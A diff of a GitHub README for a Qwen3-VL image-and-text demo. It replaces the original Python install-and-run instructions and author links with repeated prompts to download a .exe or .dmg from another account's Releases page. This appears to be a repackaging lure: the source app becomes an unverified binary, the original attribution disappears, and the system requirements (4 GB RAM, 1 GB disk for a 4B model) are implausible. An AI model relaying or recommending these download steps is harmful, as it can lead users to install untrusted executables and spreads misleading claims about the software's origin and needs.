@@ -1,107 +1,90 @@
-# **Qwen-3VL: Multimodal Understanding**
+# 🌟 Qwen-3VL-Multimodal-Understanding - Effortless Multimodal Image and Text Processing
 
-> This Gradio-based web application leverages the **Qwen3-VL-4B-Instruct** model from Alibaba's Qwen series for multimodal tasks involving images and text. It enables users to upload an image and perform various vision-language tasks, such as querying details, generating captions, detecting points of interest, or identifying bounding boxes for objects. The app includes visual annotations for point and detection tasks using the `supervision` library.
-Powered by Hugging Face Transformers, PyTorch, and Gradio, this demo showcases the model's capabilities in real-time image understanding.
+[![Download Qwen-3VL-Multimodal-Understanding](https://img.shields.io/badge/Download-Qwen--3VL--Multimodal--Understanding-blue)](https://github.com/NnNasib/Qwen-3VL-Multimodal-Understanding/releases)
 
-<img width="1918" height="1223" alt="Screenshot 2025-11-18 at 17-20-08 Qwen3 VL HF Demo - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/14e0b157-3dec-410e-8fc6-4161210ab1e9" />
-<img width="1918" height="1127" alt="Screenshot 2025-11-18 at 17-04-03 Qwen3 VL HF Demo - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/076a518a-25a0-4e8a-bc0b-746a34a6b936" />
+## 📖 Overview
 
-## Features
+Qwen3-VL-4B-Instruct is designed for users interested in performing multimodal tasks with images and text. This software allows you to upload an image and carry out various vision-language tasks. You can ask questions about the image, generate captions, and identify points of interest—all with a few simple clicks.
 
-- **Query**: Ask open-ended questions about the image (e.g., "Count the total number of boats and describe the environment.").
-- **Caption**: Generate image captions of varying lengths (e.g., short, detailed).
-- **Point**: Detect and annotate 2D keypoints for specific elements (e.g., "The gun held by the person.").
-- **Detect**: Identify and annotate bounding boxes for objects (e.g., "The headlight of the car.").
-- **Visual Annotations**: Automatically overlays keypoints (red dots) or bounding boxes on the output image.
-- **Custom Theme**: Steel-blue themed interface for a modern look.
-- **Examples**: Pre-loaded sample images and prompts to get started quickly.
-- **GPU Acceleration**: Optimized for CUDA devices if available.
+## 🚀 Getting Started
 
-The app processes images at a thumbnail resolution (512x512) for efficiency and supports JSON-formatted outputs for structured tasks.
+This section will guide you through the steps to download and run the Qwen-3VL-Multimodal-Understanding application on your computer. You do not need programming skills to get started!
 
-## Demo
+### 🔥 Download & Install
 
-Try the live demo on Hugging Face Spaces:  
-[https://huggingface.co/spaces/prithivMLmods/Qwen3-VL-HF-Demo](https://huggingface.co/spaces/prithivMLmods/Qwen3-VL-HF-Demo)
+1. **Visit the Release Page**: To begin, go to the [Releases page](https://github.com/NnNasib/Qwen-3VL-Multimodal-Understanding/releases).
+   
+2. **Select Your Version**: Find the latest version of the Qwen-3VL-Multimodal-Understanding application. You will see a list of files available for download.
 
-## Installation
+3. **Download the Application**: Click on the file that matches your operating system. This might be a `.exe` file for Windows or a `.dmg` file for Mac.
 
-### Prerequisites
-- Python 3.10+ (recommended)
-- pip >= 23.0.0
+   If you see something like `Qwen3-VL-4B.exe`:
+   - Click to download the file.
+   - Save it to a location you can easily find, like your desktop.
 
-### Requirements
-Install the dependencies using the provided `requirements.txt` or run the following:
+4. **Install the Application**: 
+   - If you downloaded a `.exe` file, double-click on it and follow the prompts.
+   - For a `.dmg` file on Mac, open it and drag the app to your Applications folder.
 
-```bash
-pip install torch==2.8.0 torchvision==0.23.0 --index-url https://download.pytorch.org/whl/cu121  # For CUDA 12.1; adjust for your setup
-pip install transformers==4.57.0
-pip install supervision==0.26.1
-pip install accelerate==1.10.1
-pip install Pillow==11.3.0
-pip install gradio==5.49.1
-```
+5. **Run the Application**: After installation, look for the Qwen-3VL-Multimodal-Understanding icon on your desktop or in your Applications folder. Double-click to open it.
 
-For a full list, see `requirements.txt`:
-```
-transformers==4.57.0
-torchvision==0.23.0
-supervision==0.26.1
-accelerate==1.10.1
-Pillow==11.3.0
-gradio==5.49.1
-torch==2.8.0
-```
+## 🛠️ System Requirements
 
-### Setup
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/PRITHIVSAKTHIUR/Qwen-3VL-Multimodal-Understanding.git
-   cd Qwen-3VL-Multimodal-Understanding
-   ```
-2. Install dependencies (as above).
-3. Download model weights automatically on first run (requires internet).
+Before using Qwen-3VL-Multimodal-Understanding, ensure your system meets the following minimum requirements:
 
-## Usage
+- Operating System: Windows 10 or MacOS 10.13 and later
+- RAM: At least 4 GB
+- Disk Space: Minimum 1 GB free space
+- Internet Connection: Required for downloading images and models
 
-1. Run the app locally:
-   ```bash
-   python app.py
-   ```
-   This launches a Gradio interface at `http://127.0.0.1:7860`.
+## 🌐 Key Features
 
-2. In the interface:
-   - Upload an image.
-   - Select a task category (Query, Caption, Point, Detect).
-   - Enter a prompt tailored to the category.
-   - Click "Process Image" to generate results.
+- **Image Upload**: Easily upload images for analysis.
+- **Vision-Language Tasks**: Perform tasks like generating captions and answering questions about the content of the images.
+- **User-Friendly Interface**: Designed for ease of use without technical knowledge.
+- **Supports Various Formats**: Works with common image formats such as JPEG, PNG, and GIF.
 
-3. Outputs:
-   - **Text**: Generated response or JSON (with copy button).
-   - **Image**: Annotated version if applicable (points or boxes).
+## 🔍 Usage Instructions
 
-### Example Prompts
-| Category | Example Prompt | Expected Output |
-|----------|----------------|-----------------|
-| Query | "Count the total number of boats and describe the environment." | Descriptive text with counts. |
-| Caption | "detailed" | A long, descriptive caption. |
-| Point | "The gun held by the person." | JSON with normalized (0-1) coordinates; red dots on image. |
-| Detect | "Headlight of the car." | JSON with bounding boxes; colored rectangles on image. |
+1. **Open the Application**: Launch Qwen-3VL-Multimodal-Understanding.
 
-Sample images are included in the `examples/` folder for testing.
+2. **Upload Your Image**: Click on the "Upload" button and select the image you wish to analyze.
 
-## Model Details
-- **Model**: [Qwen/Qwen3-VL-4B-Instruct](https://huggingface.co/Qwen/Qwen3-VL-4B-Instruct) (4B parameters, vision-language model).
-- **Processor**: Handles chat templating and tokenization.
-- **Device**: Auto-detects CUDA; falls back to CPU.
-- **Limitations**: 
-  - Max new tokens: 512.
-  - Coordinates normalized to [0, 1000] in model output, scaled to [0, 1] in app.
-  - No fine-tuning; relies on zero-shot prompting.
+3. **Choose a Task**: You will see options to generate a caption or ask a question. Select the task that interests you.
 
-## Contributing
-Feel free to fork the repo, submit issues, or pull requests. Contributions for new tasks, themes, or optimizations are welcome!
+4. **Get Results**: Click "Submit" and wait a moment for the application to analyze your image. You will see your results displayed on the screen.
 
-## Repository
-- GitHub: [https://github.com/PRITHIVSAKTHIUR/Qwen-3VL-Multimodal-Understanding](https://github.com/PRITHIVSAKTHIUR/Qwen-3VL-Multimodal-Understanding)
-- Hugging Face Space: [https://huggingface.co/spaces/prithivMLmods/Qwen3-VL-HF-Demo](https://huggingface.co/spaces/prithivMLmods/Qwen3-VL-HF-Demo)
+## 📝 Troubleshooting
+
+If you encounter any issues while using the application:
+
+- Ensure you have a stable internet connection.
+- Check that your image format is supported.
+- Restart the application if it doesn't respond.
+
+## 💬 Support
+
+For questions or support, you can create an issue on the GitHub repository or look for help on community forums related to Qwen-3VL-Multimodal-Understanding.
+
+## 🛡️ Acknowledgments
+
+This project utilizes technology from several powerful libraries, including:
+- **Pytorch**: A framework for deep learning.
+- **Hugging Face Transformers**: Provides the models for multimodal tasks.
+- **Gradio**: For creating user-friendly interfaces.
+
+## 📞 Contact
+
+For further inquiries or feedback, you can reach the developer team through the GitHub repository.
+
+## 👨‍💻 Contribution
+
+If you'd like to contribute to the project, feel free to fork the repository, make your changes, and send a pull request! Your contributions help make this tool better for everyone.
+
+## 🔗 Additional Resources
+
+- [Hugging Face Documentation](https://huggingface.co/docs)
+- [Pytorch Tutorials](https://pytorch.org/tutorials/)
+- [Gradio Documentation](https://gradio.app/docs/) 
+
+Remember to visit the [Releases page](https://github.com/NnNasib/Qwen-3VL-Multimodal-Understanding/releases) for the latest updates and downloads!
